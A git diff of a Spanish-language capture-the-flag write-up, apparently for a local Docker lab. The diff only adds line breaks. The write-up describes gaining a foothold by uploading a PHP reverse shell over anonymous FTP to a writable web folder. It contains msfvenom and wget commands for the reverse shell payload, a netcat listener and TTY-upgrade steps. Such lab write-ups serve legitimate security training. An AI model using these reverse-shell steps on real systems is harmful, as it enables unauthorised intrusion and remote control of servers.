@@ -39,10 +39,16 @@ Ademas, el puerto 21 (FTP) nos permite el acceso mediante login anonimo:
 |      vsFTPd 3.0.5 - secure, fast, stable
 |_End of status
 ```
-Probamos pues a entrar, y vemos que hay los mismos archivos/directorios que se ven en la info de arriba. Ademas, vemos que la carpeta "/upload" tiene tanto permisos de lectura como de escritura.
+Probamos pues a entrar, y vemos que hay los mismos archivos/directorios que se ven en la info de arriba.
+
+Ademas, vemos que la carpeta "/upload" tiene tanto permisos de lectura como de escritura.
+
 Es momento de poner la IP en el navegador y ver que nos encontramos por el puerto 80.
+
 Se puede observar una especie de pagina en construccion, con un acceso al backend (en realidad es la carpeta "/upload" que hemos visto antes), acceso a un panel de contacto, etc...
+
 Bien, sabiendo esto, lo que vamos a hacer es crear una reverse shell en formato ".php" y subirla a la carpeta "/upload" mediante "ftp" para poder tener acceso a la maquina victima.
+
 Para ello creamos primero la reverse shell, bien con "msfvenom":
 ```
 msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > reverse.php 
@@ -61,11 +67,13 @@ $daemon = 0;
 $debug = 0;
 ```
 En esta ocasion, yo voy a usar la segunda ya que nunca la he usado y asi practico.
+
 Para ello escribo:
 ```
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
 Una vez obtenida la reverse del repositorio de "pentestmonkey", modificamos los parametros que he mencionado anteriormente, poniendo mi IP (172.17.0.1) y mi puerto (4444). Ambos de la maquina atacante.
+
 Es momento ahora de subirla mediante "ftp" a la carpeta "upload":
 ```
 ftp 172.17.0.2
@@ -96,11 +104,13 @@ ftp> ls
 ftp> 
 ```
 Vale, una vez subida, vemos que esta en la pagina web, en la seccion de "/upload".
+
 Antes de ejecutar este archivo, es momento de ponerse a la escucha con "netcat" por el puerto 4444 como hemos dicho en la reverse:
 ```
 nc -nlvp 4444
 ```
 Ahora, ejecutamos el archivo ".php" desde la pagina web, y obtenemos la reverse en nuestra terminal. Perfecto.
+
 Antes de seguir, vamos a hacer el tratamiento de la TTY, asi que para ello escribimos COMO SIEMPRE:
 ```
 script /dev/null -c bash
@@ -111,6 +121,7 @@ export TERM=xterm
 export SHELL=bash
 ```
 Y listo, tratamiento de la TTY hecha. Ya podemos seguir con la escalada de privilegios. 
+
 Lo primero de todo seria hacer un "whoami" para ver que usuario somos.
 ```
 www-data@2f0c6287c77b:/$ whoami
